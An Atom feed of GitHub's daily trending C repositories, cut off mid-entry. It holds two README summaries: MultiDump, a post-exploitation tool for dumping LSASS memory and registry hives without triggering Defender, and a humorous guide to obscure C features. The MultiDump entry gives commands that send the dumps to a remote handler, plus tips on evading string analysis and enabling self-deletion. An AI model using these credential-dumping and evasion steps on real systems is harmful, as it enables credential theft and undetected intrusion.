<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-02-10T01:26:08Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>Xre0uS/MultiDump</title>
    <updated>2024-02-10T01:26:08Z</updated>
    <id>tag:github.com,2024-02-10:/Xre0uS/MultiDump</id>
    <link href="https://github.com/Xre0uS/MultiDump" rel="alternate"></link>
    <summary type="html">&lt;p&gt;MultiDump is a post-exploitation tool for dumping and extracting LSASS memory discreetly.&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;MultiDump&lt;/h2&gt; &#xA;&lt;p&gt;MultiDump is a post-exploitation tool written in C for dumping and extracting LSASS memory discreetly, without triggering Defender alerts, with a handler written in Python.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Xre0uS/MultiDump/main/multidump-defender.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Blog post: &lt;a href=&#34;https://xre0us.github.io/posts/multidump&#34;&gt;https://xre0us.github.io/posts/multidump&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;MultiDump supports LSASS dump via &lt;code&gt;ProcDump.exe&lt;/code&gt; or &lt;code&gt;comsvc.dll&lt;/code&gt;, it offers two modes: a local mode that encrypts and stores the dump file locally, and a remote mode that sends the dump to a handler for decryption and analysis.&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;    __  __       _ _   _ _____&#xA;   |  \/  |_   _| | |_(_)  __ \ _   _ _ __ ___  _ __&#xA;   | |\/| | | | | | __| | |  | | | | | &#39;_ ` _ \| &#39;_ \&#xA;   | |  | | |_| | | |_| | |__| | |_| | | | | | | |_) |&#xA;   |_|  |_|\__,_|_|\__|_|_____/ \__,_|_| |_| |_| .__/&#xA;                                               |_|&#xA;&#xA;Usage:  MultiDump.exe [-p &amp;lt;ProcDumpPath&amp;gt;] [-l &amp;lt;LocalDumpPath&amp;gt; | -r &amp;lt;RemoteHandlerAddr&amp;gt;] [--procdump] [-v]&#xA;&#xA;-p              Path to save procdump.exe, use full path. Default to temp directory&#xA;-l              Path to save encrypted dump file, use full path. Default to current directory&#xA;-r              Set ip:port to connect to a remote handler&#xA;--procdump      Writes procdump to disk and use it to dump LSASS&#xA;--nodump        Disable LSASS dumping&#xA;--reg           Dump SAM, SECURITY and SYSTEM hives&#xA;--delay         Increase interval between connections to for slower network speeds&#xA;-v              Enable verbose mode&#xA;&#xA;MultiDump defaults in local mode using comsvcs.dll and saves the encrypted dump in the current directory.&#xA;Examples:&#xA;        MultiDump.exe -l C:\Users\Public\lsass.dmp -v&#xA;        MultiDump.exe --procdump -p C:\Tools\procdump.exe -r 192.168.1.100:5000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;usage: MultiDumpHandler.py [-h] [-r REMOTE] [-l LOCAL] [--sam SAM] [--security SECURITY] [--system SYSTEM] [-k KEY] [--override-ip OVERRIDE_IP]&#xA;&#xA;Handler for RemoteProcDump&#xA;&#xA;options:&#xA;  -h, --help            show this help message and exit&#xA;  -r REMOTE, --remote REMOTE&#xA;                        Port to receive remote dump file&#xA;  -l LOCAL, --local LOCAL&#xA;                        Local dump file, key needed to decrypt&#xA;  --sam SAM             Local SAM save, key needed to decrypt&#xA;  --security SECURITY   Local SECURITY save, key needed to decrypt&#xA;  --system SYSTEM       Local SYSTEM save, key needed to decrypt&#xA;  -k KEY, --key KEY     Key to decrypt local file&#xA;  --override-ip OVERRIDE_IP&#xA;                        Manually specify the IP address for key generation in remote mode, for proxied connection&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;As with all LSASS related tools, Administrator/SeDebugPrivilege priviledges are required.&lt;/p&gt; &#xA;&lt;p&gt;The handler depends on &lt;a href=&#34;https://github.com/skelsec/pypykatz&#34;&gt;Pypykatz&lt;/a&gt; to parse the LSASS dump, and &lt;a href=&#34;https://github.com/fortra/impacket&#34;&gt;impacket&lt;/a&gt; to parse the registry saves. They should be installed in your enviroment. If you see the error &lt;code&gt;All detection methods failed&lt;/code&gt;, it&#39;s likely the Pypykatz version is outdated.&lt;/p&gt; &#xA;&lt;p&gt;By default, MultiDump uses the &lt;code&gt;Comsvc.dll&lt;/code&gt; method and saves the encrypted dump in the current directory.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;MultiDump.exe&#xA;...&#xA;[i] Local Mode Selected. Writing Encrypted Dump File to Disk...&#xA;[i] C:\Users\MalTest\Desktop\dciqjp.dat Written to Disk.&#xA;[i] Key: 91ea54633cd31cc23eb3089928e9cd5af396d35ee8f738d8bdf2180801ee0cb1bae8f0cc4cc3ea7e9ce0a74876efe87e2c053efa80ee1111c4c4e7c640c0e33e&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./ProcDumpHandler.py -f dciqjp.dat -k 91ea54633cd31cc23eb3089928e9cd5af396d35ee8f738d8bdf2180801ee0cb1bae8f0cc4cc3ea7e9ce0a74876efe87e2c053efa80ee1111c4c4e7c640c0e33e&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If &lt;code&gt;--procdump&lt;/code&gt; is used, &lt;code&gt;ProcDump.exe&lt;/code&gt; will be writtern to disk to dump LSASS.&lt;/p&gt; &#xA;&lt;p&gt;In remote mode, MultiDump connects to the handler&#39;s listener.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./ProcDumpHandler.py -r 9001&#xA;[i] Listening on port 9001 for encrypted key...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;MultiDump.exe -r 10.0.0.1:9001&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The key is encrypted with the handler&#39;s IP and port. When MultiDump connects through a proxy, the handler should use the &lt;code&gt;--override-ip&lt;/code&gt; option to manually specify the IP address for key generation in remote mode, ensuring decryption works correctly by matching the decryption IP with the expected IP set in MultiDump &lt;code&gt;-r&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;An additional option to dump the &lt;code&gt;SAM&lt;/code&gt;, &lt;code&gt;SECURITY&lt;/code&gt; and &lt;code&gt;SYSTEM&lt;/code&gt; hives are available with &lt;code&gt;--reg&lt;/code&gt;, the decryption process is the same as LSASS dumps. This is more of a convenience feature to make post exploit information gathering easier.&lt;/p&gt; &#xA;&lt;h3&gt;Building MultiDump&lt;/h3&gt; &#xA;&lt;p&gt;Open in Visual Studio, build in &lt;strong&gt;Release&lt;/strong&gt; mode.&lt;/p&gt; &#xA;&lt;h3&gt;Customising MultiDump&lt;/h3&gt; &#xA;&lt;p&gt;It is recommended to customise the binary before compiling, such as changing the static strings or the RC4 key used to encrypt them, to do so, another Visual Studio project &lt;code&gt;EncryptionHelper&lt;/code&gt;, is included. Simply change the key or strings and the output of the compiled &lt;code&gt;EncryptionHelper.exe&lt;/code&gt; can be pasted into &lt;code&gt;MultiDump.c&lt;/code&gt; and &lt;code&gt;Common.h&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Self deletion can be toggled by uncommenting the following line in &lt;code&gt;Common.h&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define SELF_DELETION&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To further evade string analysis, most of the output messages can be excluded from compiling by commenting the following line in &lt;code&gt;Debug.h&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;//#define DEBUG&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;MultiDump might get detected on Windows 10 22H2 (19045) (sort of), and I have implemented a fix for it (sort of), the investigation and implementation deserves a blog post itself: &lt;a href=&#34;https://xre0us.github.io/posts/saving-lsass-from-defender/&#34;&gt;https://xre0us.github.io/posts/saving-lsass-from-defender/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Some techniques used learnt from &lt;a href=&#34;https://maldevacademy.com&#34;&gt;MalDev Academy&lt;/a&gt;, it is an awesome course, highly recommended&lt;/li&gt; &#xA; &lt;li&gt;Inspired by &lt;a href=&#34;https://github.com/djackreuter/proc_noprocdump&#34;&gt;proc_noprocdump&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Code to further process LSASS dump from &lt;a href=&#34;https://github.com/Hackndo/lsassy&#34;&gt;lsassy&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Testing and suggestions from &lt;a href=&#34;https://github.com/ballro&#34;&gt;ballro&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Testing and suggestions from &lt;a href=&#34;https://github.com/DisplayGFX&#34;&gt;DisplayGFX&lt;/a&gt;, &lt;a href=&#34;https://github.com/nthdeg&#34;&gt;nthdeg&lt;/a&gt; and silentbee&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>agvxov/cursed_c</title>
    <updated>2024-02-10T01:26:08Z</updated>
    <id>tag:github.com,2024-02-10:/agvxov/cursed_c</id>
    <link href="https://github.com/agvxov/cursed_c" rel="alternate"></link>
    <summary type="html">&lt;p&gt;An attempt to create the worst C program ever by repeatedly abusing obscure features. See c.c for the core code. Note that there were no version restraints imposed and extensions are also included.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Cursed C&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;An attempt to create the worst C program ever by repeatedly abusing obscure features. See &lt;code&gt;c.c&lt;/code&gt; for the core code. Note that there were no version restraints imposed and extensions are also included.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/agvxov/cursed_c/master/media/cursed_c_1.mini.jpeg&#34; alt=&#34;demo&#34;&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Rationale&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;it was fun&lt;/li&gt; &#xA; &lt;li&gt;perhaps it will be educational for someone&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Break down&lt;/h2&gt; &#xA;&lt;h3&gt;File naming&lt;/h3&gt; &#xA;&lt;p&gt;&lt;code&gt;c.c&lt;/code&gt; is the least descriptive name imaginable to man. It neither marks what project it belongs to or what purpose it has inside the project.&lt;/p&gt; &#xA;&lt;h3&gt;Trigraph characters&lt;/h3&gt; &#xA;&lt;p&gt;There used to be a time when there were computers widely in use without the ability to type some &#34;normal&#34; characters. So alternative representations were added to replace them. Basically built-in macros. Under &lt;code&gt;gcc&lt;/code&gt; the &lt;code&gt;-trigraphs&lt;/code&gt; flag is actually required to make them available.&lt;/p&gt; &#xA;&lt;p&gt;The ones relevant here are:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;??=    :    #&#xA;??&amp;lt;    :    {&#xA;??&amp;gt;    :    }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;So for example &lt;code&gt;??=define&lt;/code&gt; really is just equivalent to &lt;code&gt;#define&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;$$$&lt;/h3&gt; &#xA;&lt;p&gt;The dollar sign is valid to be the first (and only the first) char of a symbol name. My guess is that it is so for stubborn people who prefer their variable names to start with a &#39;$&#39; as it has to in some other languages. Perhaps it&#39;s for ancient parsers/syntax highlighters? Create an issue if you know better.&lt;/p&gt; &#xA;&lt;h3&gt;Concatenation macro operator&lt;/h3&gt; &#xA;&lt;p&gt;&lt;code&gt;##&lt;/code&gt; is a special operator available inside macro definitions. It will literally glue together the arguments on its 2 sides. Historically it has been used to generate symbol names.&lt;/p&gt; &#xA;&lt;h3&gt;include_next&lt;/h3&gt; &#xA;&lt;p&gt;Including is surprisingly high-level with search paths and precedence. Turns out this happens to open a hole in functionality, which is otherwise absent from C.&lt;/p&gt; &#xA;&lt;p&gt;So, &lt;code&gt;#include &amp;lt;myheader.h&amp;gt;&lt;/code&gt; will start trying to include the file &#39;myheader.h&#39; searching for in whatever directories the linker considers to contain system header files. Then, &lt;code&gt;#include &#34;myheader.h&#34;&lt;/code&gt; start from the current directory, but falls back to the &lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt; behavior. In either case, whatever is found first to satisfy the file name is taken. Now, what happens if we do not want the first? Or rather, we must have another.&lt;/p&gt; &#xA;&lt;p&gt;As the GNU documentation explains it through an example, say you wish to override a system header -say wrap it, but your own header depends on the original one. Standard C provides no way to resolve the situation.&lt;/p&gt; &#xA;&lt;p&gt;For this reason &lt;code&gt;#include_next&lt;/code&gt; was added as a widely accepted extension, which excludes the current path from the list of searchable paths to prohibit recursive inclusion.&lt;/p&gt; &#xA;&lt;h3&gt;iso646.h&lt;/h3&gt; &#xA;&lt;p&gt;From what I&#39;ve seen, this perfectly standard header that tends to be relatively little known. If you know C++ and about its keyword operators, then this is what defines their equivalents in C. E.g &lt;code&gt;and&lt;/code&gt;, &lt;code&gt;or&lt;/code&gt;, etc.&lt;/p&gt; &#xA;&lt;p&gt;Later down it&#39;s abused to get the address of &lt;code&gt;≈±&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;bitand ≈±&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Where -you guessed it, &lt;code&gt;bitand&lt;/code&gt; is just macrod to be &lt;code&gt;&amp;amp;&lt;/code&gt; at the end of the day.&lt;/p&gt; &#xA;&lt;h3&gt;_Decimal32&lt;/h3&gt; &#xA;&lt;p&gt;It&#39;s exactly what it sounds like, a decimal fraction available in C. Here, as a GNU extension.&lt;/p&gt; &#xA;&lt;h3&gt;Dot dot dot&lt;/h3&gt; &#xA;&lt;p&gt;Not nearly as obscure as the rest, but worth including. &lt;code&gt;...&lt;/code&gt; signals to the compiler that any number of values may be pushed into the stack on any call to this function. Normally &lt;code&gt;stdarg.h&lt;/code&gt; and its va_list (&#34;Variable Argument LIST&#34;) would be used or some pointer magic applied by hand to read said values, but here they are just left unused.&lt;/p&gt; &#xA;&lt;p&gt;The most famous function using this feature has to be &lt;code&gt;printf&lt;/code&gt;. In glibc it&#39;s defined as:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;extern int printf (const char *__restrict __format, ...);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;That&#39;s why it can handle both&lt;code&gt;printf(&#34;%d&#34;, 1)&lt;/code&gt; and &lt;code&gt;printf(&#34;%d %d&#34;, 1, 2)&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;const const const&lt;/h3&gt; &#xA;&lt;p&gt;The specifier &lt;code&gt;const&lt;/code&gt; turns out to be infinitly stackable. In fact, it can be applied to the wrong spot too.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;const const int i;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Reduces to:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;const int i;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This program makes both the pointed value and the pointer constant, then reiterates it a few times for good measure.&lt;/p&gt; &#xA;&lt;p&gt;With a bit of simplification:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;   const char const * const;&#xA;//   ^          ^       ^&#xA;//   |          |       |&#xA;//   |          |  constant pointer&#xA;//   |          |&#xA;//   |  const... air? for no effect&#xA;//   |&#xA;// constant character value&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Naming&lt;/h3&gt; &#xA;&lt;p&gt;Having multi-char long variable names is bloat. Naming everything a single letter is the way of the warrior.&lt;/p&gt; &#xA;&lt;h4&gt;≈∞&lt;/h4&gt; &#xA;&lt;p&gt;&#39;≈±&#39; is letter in the Hungarian alphabet. The reason it was chosen is because it is non-ascii. Don&#39;t like it? Perhaps switch it out for a &#39;üòÅ&#39;, which is also valid due to the same mechanic.&lt;/p&gt; &#xA;&lt;h3&gt;Haskel style semi-colons&lt;/h3&gt; &#xA;&lt;p&gt;I guess it&#39;s self-evident that C being whitespace agnostic, starting every line with &#39;;&#39; instead of closing them with it, is valid, however it&#39;s a rarely thought about possibility. Also, semi-colons are stackable.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Pro-tip:&lt;/strong&gt; the next time someone proposes indenting with spaces to you, suggest indenting with semi-colons.&lt;/p&gt; &#xA;&lt;h3&gt;&#39;a&#39; array&lt;/h3&gt; &#xA;&lt;p&gt;When accessing an array element, &lt;code&gt;a[n]&lt;/code&gt; is equivalent to &lt;code&gt;&amp;amp;a + n&lt;/code&gt;. Note that the address is taken only figuratively, the array &lt;code&gt;a&lt;/code&gt; decays to a pointer to the first element, so the more scientific notation is &lt;code&gt;*(a + n)&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Smiles&lt;/h4&gt; &#xA;&lt;p&gt;Like trigraphs, but they are too hard to type? Digraphs are for you! :&amp;gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;%:    :    #&#xA;&amp;lt;%    :    {&#xA;%&amp;gt;    :    }&#xA;&amp;lt;:    :    [&#xA;:&amp;gt;    :    ]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Reverse reference&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;-1[$a];&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;No, we are not trying to access the &lt;code&gt;$a&lt;/code&gt;th element of &lt;code&gt;-1&lt;/code&gt;. Addition commutative, hence &lt;code&gt;*(a + n)&lt;/code&gt; == &lt;code&gt;*(n + a)&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The above evaluates exactly like:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;$a[-1];&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Negative index&lt;/h4&gt; &#xA;&lt;p&gt;Since &lt;code&gt;a + (-n)&lt;/code&gt; is &lt;code&gt;a - n&lt;/code&gt;, it just werks‚Ñ¢.&lt;/p&gt; &#xA;&lt;h3&gt;Puts call&lt;/h3&gt; &#xA;&lt;p&gt;Perhaps you noticed &lt;code&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/code&gt; missing. Don&#39;t worry, the compiler will implicitly handle it for us!&lt;/p&gt; &#xA;&lt;h3&gt;Return&lt;/h3&gt; &#xA;&lt;p&gt;Relative to Assembly, C is high-level. And in many cases, for Assembly programmers, the &lt;code&gt;return&lt;/code&gt; statement high-level enough to be considered many ways similar to a function. For this reason they may stick to the following syntax:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;return(0);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;END comments&lt;/h3&gt; &#xA;&lt;p&gt;Large blocks being closed with their type/name explicitly mentioned tend to be more readable than otherwise. With C however a nice balance of size is attainable. Overshoot a bit and you get people pretending comments are significant. Wait 30 years and -looking for a more radical solution- they form a cult around DRY.&lt;/p&gt; &#xA;&lt;h3&gt;Attributes&lt;/h3&gt; &#xA;&lt;p&gt;Attributes tend to be left out from textbooks, but they are extremely cool. They provide ways to both aid the compiler (or make it shut up) and make code self-documenting.&lt;/p&gt; &#xA;&lt;p&gt;Too bad that C botched the syntax. Consider the following:&lt;/p&gt; &#xA;&lt;p&gt;Both of these specify that &lt;code&gt;func&lt;/code&gt; will never return.&lt;/p&gt; &#xA;&lt;p&gt;C:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;__attribute__((noreturn))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;C++:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;[[ noreturn ]]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Google?&lt;/h3&gt; &#xA;&lt;p&gt;Google.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;; https://google.com&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;URLs happen to be valid C. More precisely, they are -due to pure chance- a label plus a comment. You can only have one per protocol per function, choose wisely.&lt;/p&gt; &#xA;&lt;p&gt;The address was chosen in particular, because hard coding google endpoints into source is as evil (or rather, no longer &#34;don&#39;t be evil&#34;) as it gets.&lt;/p&gt; &#xA;&lt;h3&gt;?&lt;/h3&gt; &#xA;&lt;p&gt;If one asks a C programmer &#34;can the ternary operator be used to conditionally declare a variable&#34; even if he never needed to use it, he will instinctively answer yes. Yet, no one seems to ever state this -truth be told, rare times, but- very useful feature. Instead, its main purpose is to serve as premature formatting.&lt;/p&gt; &#xA;&lt;p&gt;While the functionality is not cursed, the poor operator itself seems to be.&lt;/p&gt; &#xA;&lt;h3&gt;Nested functions&lt;/h3&gt; &#xA;&lt;p&gt;You would be surprised to know how popular these things used to be in the past. And I&#39;m not talking about C in particular.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;In the case of nested procedures, the scope rules permit, for example, the definition of a procedure to include the definition of subsidiary procedures without concern for interference with other global procedures. This capability facilitates writing pro- cedures and often simplifies their usage.&lt;/p&gt; &#xA; &lt;p&gt;-- David R. Hanson; Is Block Structure Necessary? (1981)&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Yet, they have fallen out from the public&#39;s taste so much that C++ disallows it. Nested classes seem to be looked down upon too now days, even in bloody Java tutorials where providing a single file would be so damn much clearer and easier, but I digress.&lt;/p&gt; &#xA;&lt;h3&gt;String literal concatanation&lt;/h3&gt; &#xA;&lt;p&gt;Adjacent string literals are always (compile time) concatenated. Therefore:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;&#34;Make it stop, cruel&#34; &#34; &#34; &#34;w&#34; &#34;o&#34; &#34;r&#34; &#34;l&#34; &#34;d&#34; &#34;!&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Costlessly becomes:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;&#34;Make it stop, cruel world!&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Why is it cursed? Ask who ever does this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;puts(&#34;Message line 1&#34;);&#xA;puts(&#34;Message line 2&#34;);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Instead of:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;puts(&#34;Message line 1\n&#34;&#xA;     &#34;Message line 2&#34;);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Literal pointer artimetrics&lt;/h3&gt; &#xA;&lt;p&gt;A string literal &#34;decays&#34; into a const char pointer, therefore &lt;code&gt;puts(&#34;//Please!&#34; + 2)&lt;/code&gt; is just the heretic way of saying:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;const char * s = &#34;//Please!&#34;;&#xA;puts(s + 2);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Batch assignment&lt;/h3&gt; &#xA;&lt;p&gt;The assignment operator is not particularly &#34;special&#34; in C. It does the actual value copying, but then plainly &#34;returns&#34; a value of its own. Which happens to be defined as the one assigned.&lt;/p&gt; &#xA;&lt;p&gt;&#34;Tricks&#34; like this and such:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;    do {&#xA;        // ...&#xA;    } while(i = fun());&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;tend to be pretty neat.&lt;/p&gt; &#xA;&lt;p&gt;However, for wholeness, it stacks.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;i = h = j = k&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Is evaluated right to left. I.e. it becomes &#34;assign k to j; assign j to h; assign h to i;&#34;. So what value does &lt;code&gt;i&lt;/code&gt; hold after the operation? No one knows, since &lt;code&gt;k&lt;/code&gt; was never initialized!&lt;/p&gt; &#xA;&lt;h3&gt;Comma operator&lt;/h3&gt; &#xA;&lt;p&gt;The comma operator evaluates the expressions on both sides, then returns the value returned by the right-hand side. Again, it&#39;s stackable.&lt;/p&gt; &#xA;&lt;p&gt;This -similar to the wise usage of assignments,- opens a little door for playing with loop conditions.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;do {&#xA;    // ...&#xA;} while((fun(&amp;amp;a), a));&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;But also, if you ever wanted to make semi-colons jealous to make them love you more, here is your chance.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;fun1(), fun2(), fun3(), fun4()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Do not use the comma operator.&lt;/p&gt; &#xA; &lt;p&gt;Do not use the comma operator.&lt;/p&gt; &#xA; &lt;p&gt;Do not use the comma operator.&lt;/p&gt; &#xA; &lt;p&gt;[...]&lt;/p&gt; &#xA; &lt;p&gt;Do not use the comma operator.&lt;/p&gt; &#xA; &lt;p&gt;Do not use the comma operator.&lt;/p&gt; &#xA; &lt;p&gt;Do not use the comma operator.&lt;/p&gt; &#xA; &lt;p&gt;-- Repeater, &lt;a href=&#34;https://cplusplus.com/forum/beginner/272615/&#34;&gt;https://cplusplus.com/forum/beginner/272615/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;K&amp;amp;R arguments&lt;/h3&gt; &#xA;&lt;p&gt;The language design of C is truely genious. Brian Kernighan and Dennis Ritchie got so many things perfectly right. One clear exception is their original function declaration syntax. Not that it doesn&#39;t make sense or does not have historical reasons, but damn is it to ugly and confusing.&lt;/p&gt; &#xA;&lt;p&gt;A reasonably cleaned up version of our &lt;code&gt;main()&lt;/code&gt; would look like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;void main(argc, argv, envp)&#xA;int argc;&#xA;char * * argv;&#xA;char * * envp;&#xA;{ ; }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Where our parameters are named first, then their type is specified. This original way, used to be the only way to do it. It may look like absolutely useless typing at first, but there are a few things to consider.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;it roots from B syntax, which is typeless:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-B&#34;&gt;main(argc, argv, envp) {&#xA;    ;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;One doesn&#39;t specify the types of your arguments until the function definition:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;&#xA;void main(argc, argv, envp);&#xA;&#xA;void main(argc, argv, envp)&#xA;char * * argv;&#xA;int argc;&#xA;char * * envp;&#xA;{ ; }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Which implies that a) you don&#39;t have to keep your declarations and definitions in sync b) calls can compile without type checking&lt;/p&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;It blends with other syntax rules, allowing this:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;void main(argc, argv, envp)&#xA;char * * argv;&#xA;int argc;&#xA;char * * envp;&#xA;{ ; }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;void main(argc, argv, envp)&#xA;int argc;&#xA;char * * argv, * * envp;&#xA;{ ; }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;I would like to declare the type of nothing&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;g() int; int; { int; }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;GCC allows you have a typename on its own line. Not even a warning in sight.&lt;/p&gt; &#xA;&lt;p&gt;Why does it allow it? Good question.&lt;/p&gt; &#xA;&lt;h3&gt;Empty parenthesis&lt;/h3&gt; &#xA;&lt;p&gt;How would you declare a function with no parameters? If you answered the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code 